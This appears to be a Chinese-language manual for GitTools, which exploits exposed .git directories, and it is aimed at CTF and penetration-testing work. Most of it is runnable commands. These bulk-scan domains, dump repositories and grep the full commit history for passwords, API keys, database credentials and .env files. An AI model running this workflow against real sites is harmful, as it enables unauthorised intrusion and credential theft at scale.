# GitTools 使用手册（Git泄露工具集）

> GitTools 是经典的 Git 泄露利用工具集，包含 Dumper、Extractor 和 Finder 三个独立工具。

---

## 目录
1. [概述](#概述)
2. [安装方法](#安装方法)
3. [Dumper - 下载工具](#dumper---下载工具)
4. [Extractor - 提取工具](#extractor---提取工具)
5. [Finder - 发现工具](#finder---发现工具)
6. [实战案例](#实战案例)
7. [常见问题](#常见问题)
8. [参考资源](#参考资源)

---

## 概述

### 工具集组成

GitTools 由三个 Bash 脚本组成:

1. **Dumper** (gitdumper.sh)
   - 功能: 下载 .git 目录
   - 特点: 递归下载所有对象

2. **Extractor** (extractor.sh)
   - 功能: 从下载的 .git 提取源码
   - 特点: 恢复每个提交的完整快照

3. **Finder** (gitfinder.py)
   - 功能: 批量查找 .git 泄露
   - 特点: 支持大规模扫描

### 优势

- ✅ **轻量级**: 纯 Bash 脚本
- ✅ **无依赖**: 只需 bash、curl、git
- ✅ **经典工具**: 广泛使用
- ✅ **提取完整**: Extractor 提取所有提交

### 劣势

- ❌ 不支持多线程
- ❌ 错误处理较弱
- ❌ 不支持 Python 3（Finder）
- ❌ 维护不活跃

---

## 安装方法

### 方法1: Git 克隆（推荐）

```bash
# 克隆仓库
git clone https://github.com/internetwache/GitTools.git
cd GitTools

# 查看工具
ls -la
# Dumper/
# Extractor/
# Finder/
```

### 方法2: 下载单个脚本

```bash
# Dumper
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh
chmod +x gitdumper.sh

# Extractor
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Extractor/extractor.sh
chmod +x extractor.sh

# Finder
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Finder/gitfinder.py
chmod +x gitfinder.py
```

### 系统要求

```bash
# 必需工具
bash >= 4.0
git
curl or wget

# Finder 需要
python 2.7
requests
```

---

## Dumper - 下载工具

### 基本用法

```bash
cd GitTools/Dumper

# 基本命令
bash gitdumper.sh http://example.com/.git/ output_dir

# 或给脚本执行权限后直接运行
chmod +x gitdumper.sh
./gitdumper.sh http://example.com/.git/ output_dir
```

### 工作流程

```
1. 下载 .git/HEAD
2. 解析 HEAD 获取当前分支引用
3. 下载 refs/heads/* 获取所有分支
4. 递归下载所有对象
5. 下载其他关键文件（index, config等）
```

### 完整示例

```bash
# 1. 进入 Dumper 目录
cd GitTools/Dumper

# 2. 下载
./gitdumper.sh http://target.com/.git/ /tmp/dump

# 3. 查看下载的内容
ls -la /tmp/dump/.git/

# 4. 验证 Git 仓库
cd /tmp/dump
git status
```

### 输出说明

```
[+] Downloading .git recursively
[+] Downloading: HEAD
[+] Downloading: objects/info/packs
[+] Downloading: objects/ab/cdef123...
...
[+] Downloaded: 150 files
```

---

## Extractor - 提取工具

### 基本用法

```bash
cd GitTools/Extractor

# 提取源码
bash extractor.sh /path/to/downloaded/.git /path/to/output

# 示例
bash extractor.sh /tmp/dump /tmp/extracted
```

### 提取过程

```
1. 读取所有提交
2. 为每个提交创建独立目录
3. 检出每个提交的完整快照
4. 生成提交信息文件
```

### 输出结构

```
extracted/
├── 0-abc123/          # 第一个提交
│   ├── commit-meta.txt
│   ├── index.php
│   └── config.php
├── 1-def456/          # 第二个提交
│   ├── commit-meta.txt
│   ├── index.php
│   ├── config.php
│   └── new_file.php
└── 2-ghi789/          # 最新提交
    ├── commit-meta.txt
    └── ...
```

### commit-meta.txt 示例

```
Author: developer <dev@example.com>
Date: 2025-01-15 10:30:00
Message: Add authentication feature

Files changed:
 M index.php
 M config.php
 A auth.php
```

### 实用技巧

```bash
# 1. 提取后查看所有提交
cd extracted
ls -la

# 2. 查看每个提交的元数据
cat 0-*/commit-meta.txt
cat 1-*/commit-meta.txt

# 3. 比较不同提交
diff -r 0-abc123/ 1-def456/

# 4. 在所有提交中搜索
grep -r "password" .
grep -r "flag{" .

# 5. 查找特定文件的演变
for dir in */; do
    echo "=== $dir ==="
    ls -l $dir/config.php 2>/dev/null
done
```

---

## Finder - 发现工具

### 基本用法

```bash
cd GitTools/Finder

# Python 2 (原始版本)
python gitfinder.py -i targets.txt

# 或 Python 3 (需要修改)
python3 gitfinder.py -i targets.txt
```

### 准备目标文件

```bash
# 创建 targets.txt
cat > targets.txt << 'EOF'
http://site1.com
http://site2.com
http://site3.com
https://example.com
EOF
```

### 参数说明

```
-i, --inputfile FILE    目标列表文件（必需）
-o, --outputfile FILE   结果输出文件
-t, --threads N         线程数（默认:20）
```

### 完整示例

```bash
# 准备目标
cat > targets.txt << 'EOF'
http://target1.com
http://target2.com
http://target3.com
EOF

# 扫描
python gitfinder.py \
    -i targets.txt \
    -o results.txt \
    -t 10

# 查看结果
cat results.txt
# 输出:
# [+] http://target1.com/.git/ (200 OK)
# [-] http://target2.com/.git/ (404 Not Found)
# [+] http://target3.com/.git/ (200 OK)
```

### 输出处理

```bash
# 提取成功的目标
grep '\[+\]' results.txt | awk '{print $2}' > vulnerable.txt

# 批量下载
while read url; do
    echo "[*] Downloading: $url"
    bash ../Dumper/gitdumper.sh "$url" "dump_$(echo $url | md5sum | cut -d' ' -f1)"
done < vulnerable.txt
```

---

## 实战案例

### 案例1: 完整工作流程

```bash
# 步骤1: 下载 .git
cd GitTools/Dumper
./gitdumper.sh http://target.com/.git/ /tmp/repo

# 步骤2: 提取所有提交
cd ../Extractor
./extractor.sh /tmp/repo /tmp/extracted

# 步骤3: 分析每个提交
cd /tmp/extracted

# 查看所有提交
ls -la

# 在所有提交中搜索 flag
grep -r "flag{" .

# 查找敏感文件的变化
for dir in */; do
    if [ -f "$dir/.env" ]; then
        echo "=== $dir ===" cat "$dir/.env"
    fi
done
```

### 案例2: 找回删除的文件

```bash
# 1. 下载并提取
./gitdumper.sh http://target.com/.git/ dump
./extractor.sh dump extracted

cd extracted

# 2. 列出所有提交的文件
for dir in */; do
    echo "=== Commit: $dir ==="
    ls $dir
done

# 3. 找到包含 secret.txt 的提交
for dir in */; do
    if [ -f "$dir/secret.txt" ]; then
        echo "[+] Found in: $dir"
        cat "$dir/secret.txt"
    fi
done
```

### 案例3: 配置文件演变追踪

```bash
# 提取所有提交
./extractor.sh dump extracted

cd extracted

# 追踪 config.php 的变化
echo "=== Config.php Evolution ==="
for dir in $(ls -d */ | sort -V); do
    if [ -f "$dir/config.php" ]; then
        echo -e "\n--- $dir ---"
        grep "password\|key\|secret" "$dir/config.php"
    fi
done
```

### 案例4: 批量扫描域名

```bash
# 准备子域名列表
cat > subdomains.txt << 'EOF'
http://www.example.com
http://admin.example.com
http://dev.example.com
http://test.example.com
http://api.example.com
EOF

# 扫描
python gitfinder.py -i subdomains.txt -o results.txt

# 下载所有发现的泄露
grep '\[+\]' results.txt | awk '{print $2}' | while read url; do
    domain=$(echo $url | sed 's/[^a-zA-Z0-9]/_/g')
    ./gitdumper.sh "$url" "dumps/$domain"
done
```

### 案例5: 历史密码泄露

```bash
# 下载并提取
./gitdumper.sh http://target.com/.git/ dump
./extractor.sh dump commits

# 在所有历史中查找密码
cd commits
grep -r "password\s*=\s*['\"]" . | grep -v ".git"

# 查找 API 密钥
grep -r "api[_-]?key\s*=\s*['\"][^'\"]\+" .

# 查找数据库凭据
grep -r "DB_PASS\|database.*password" .
```

---

## 常见问题

### 问题1: Dumper 下载不完整

**症状**: 缺少某些对象文件

**解决**:
```bash
# 1. 检查网络连接
curl http://target.com/.git/HEAD

# 2. 手动补充下载
cd dump/.git
wget http://target.com/.git/index -O index

# 3. 使用其他工具（GitHacker 或 git-dumper）
```

### 问题2: Extractor 提取失败

**症状**: 无法检出某些提交

**解决**:
```bash
# 1. 检查 .git 完整性
cd dump
git fsck

# 2. 修复损坏的仓库
git fsck --full
git gc --aggressive --prune=now

# 3. 手动提取
git log --all --oneline
git checkout <commit_hash>
```

### 问题3: Finder 无法运行

**症状**: Python 版本不兼容

**解决**:
```bash
# 修改为 Python 3
# 将 gitfinder.py 中的:
# print "text"
# 改为:
# print("text")

# 或使用 Python 2
python2 gitfinder.py -i targets.txt
```

### 问题4: 权限问题

**症状**: 脚本无执行权限

**解决**:
```bash
chmod +x gitdumper.sh
chmod +x extractor.sh
chmod +x gitfinder.py
```

### 问题5: 慢速下载

**症状**: 下载速度很慢

**解决**:
```bash
# 1. 使用其他工具（支持多线程）
githacker -u URL -o output -t 20
git-dumper URL output --jobs 20

# 2. 使用代理加速
export http_proxy=http://proxy:8080
./gitdumper.sh URL output
```

---

## 与其他工具对比

| 特性 | GitTools | GitHacker | git-dumper |
|------|----------|-----------|------------|
| 多线程 | ❌ | ✅ | ✅ |
| 依赖 | Bash | Python 3 | Python 3 |
| 提取所有提交 | ✅ | ❌ | ❌ |
| 批量扫描 | ✅ | ❌ | ❌ |
| 速度 | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 稳定性 | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 学习曲线 | 简单 | 简单 | 简单 |

### 使用建议

- **快速下载**: 使用 GitHacker 或 git-dumper
- **完整历史分析**: 使用 GitTools Extractor
- **批量扫描**: 使用 GitTools Finder
- **稳定性要求高**: 使用 git-dumper

---

## 进阶技巧

### 自动化工作流

```bash
#!/bin/bash
# 完整自动化脚本

URL="$1"
BASE_DIR="analysis_$(date +%s)"

mkdir -p "$BASE_DIR"
cd "$BASE_DIR"

echo "[1/3] 下载 .git..."
bash /path/to/GitTools/Dumper/gitdumper.sh "$URL" dump

echo "[2/3] 提取所有提交..."
bash /path/to/GitTools/Extractor/extractor.sh dump extracted

echo "[3/3] 分析..."
cd extracted

# 查找敏感信息
echo "=== Flag ==="
grep -r "flag{" . 2>/dev/null | head -10

echo -e "\n=== 密码 ==="
grep -r "password" . 2>/dev/null | grep -v ".git" | head -10

echo -e "\n=== API Key ==="
grep -r "api_key\|apikey" . 2>/dev/null | head -10

echo -e "\n完成! 结果在: $BASE_DIR"
```

---

## 参考资源

### 官方资源
- **GitHub**: https://github.com/internetwache/GitTools
- **原作者博客**: https://en.internetwache.org/

### 替代工具
- **GitHacker**: https://github.com/WangYihang/GitHacker
- **git-dumper**: https://github.com/arthaud/git-dumper

### 学习资源
- **Git 内部原理**: https://git-scm.com/book/zh/v2/
- **CTF Wiki**: https://ctf-wiki.org/misc/other/git/

---

**文档版本**: v1.0
**更新日期**: 2025-01
**适用场景**: CTF、渗透测试
